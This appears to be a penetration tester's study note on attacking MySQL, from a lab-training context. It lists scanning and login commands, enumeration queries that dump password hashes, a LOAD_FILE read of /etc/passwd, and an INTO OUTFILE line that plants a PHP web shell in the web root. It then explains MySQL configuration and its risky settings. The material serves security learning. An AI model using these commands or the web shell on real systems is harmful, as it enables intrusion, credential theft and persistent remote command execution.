##### Scanning and Connecting
```bash
nmap -Pn -n -sV -sC -p3306 --script 'mysql*' $ip

mysql -u root -pPASSWORD -h 10.10.1.100 -P 3306
mysql -u root -pPASSWORD -h 10.10.1.100 -P 3306 --skip-ssl
```

##### Enumeration - Find more [here ](obsidian://open?vault=Penetration%20Testing&file=Web%20Applications%2FSQLi%2F~%20Intro)
```sql
select version();
select system_user();
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "<string>";

SELECT user, authentication_string FROM mysql.user WHERE user = 'root';

```

##### Write Local Files
Check value of `secure_file_priv` (empty is good, NULL is bad)
```sql
show variables like "secure_file_priv";
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

##### Read Local Files
```sql
select LOAD_FILE("/etc/passwd");
```
`MySQL` is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval.

The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension `.sql`, for example, like `wordpress.sql`

### MySQL Clients
The MySQL clients can retrieve and edit the data using structured queries to the database engine. Inserting, deleting, modifying, and retrieving data, is done using the SQL database language. Therefore, MySQL is suitable for managing many different databases to which clients can send multiple queries simultaneously.

One of the best examples of database usage is the CMS WordPress. WordPress stores all created posts, usernames, and passwords in their own database, which is only accessible from the localhost.

### MySQL Databases
MySQL is ideally suited for applications such as `dynamic websites`, where efficient syntax and high response speed are essential. It is often combined with a Linux OS, PHP, and an Apache web server and is also known in this combination as [LAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)) (Linux, Apache, MySQL, PHP), or when using Nginx, as [LEMP](https://lemp.io/). In a web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored. Among these are:

| Headers                 | Texts            | Meta tags         | Forms      |
| ----------------------- | ---------------- | ----------------- | ---------- |
| Customers               | Usernames        | Administrators    | Moderators |
| Email addresses         | User information | Permissions       | Passwords  |
| External/Internal links | Links to Files   | Specific contents | Values     |

Sensitive data such as passwords can be stored in their plain-text form by MySQL; however, they are generally encrypted beforehand by the PHP scripts using secure methods such as [One-Way-Encryption](https://en.citizendium.org/wiki/One-way_encryption).

### Default Configuration
```bash
adot8@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'

[client]
port		= 3306
socket		= /var/run/mysqld/mysqld.sock

[mysqld_safe]
pid-file	= /var/run/mysqld/mysqld.pid
socket		= /var/run/mysqld/mysqld.sock
nice		= 0

[mysqld]
skip-host-cache
skip-name-resolve
user		= mysql
pid-file	= /var/run/mysqld/mysqld.pid
socket		= /var/run/mysqld/mysqld.sock
port		= 3306
basedir		= /usr
datadir		= /var/lib/mysql
tmpdir		= /tmp
lc-messages-dir	= /usr/share/mysql
explicit_defaults_for_timestamp

symbolic-links=0

!includedir /etc/mysql/conf.d/
```

### Dangerous Settings
|**Settings**|**Description**|
|---|---|
|`user`|Sets which user the MySQL service will run as.|
|`password`|Sets the password for the MySQL user.|
|`admin_address`|The IP address on which to listen for TCP/IP connections on the administrative network interface.|
|`debug`|This variable indicates the current debugging settings|
|`sql_warnings`|This variable controls whether single-row INSERT statements produce an information string if warnings occur.|
|`secure_file_priv`|This variable is used to limit the effect of data import and export operations.|
The settings `user`, `password`, and `admin_address` are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server.

The `debug` and `sql_warnings` settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web applications.

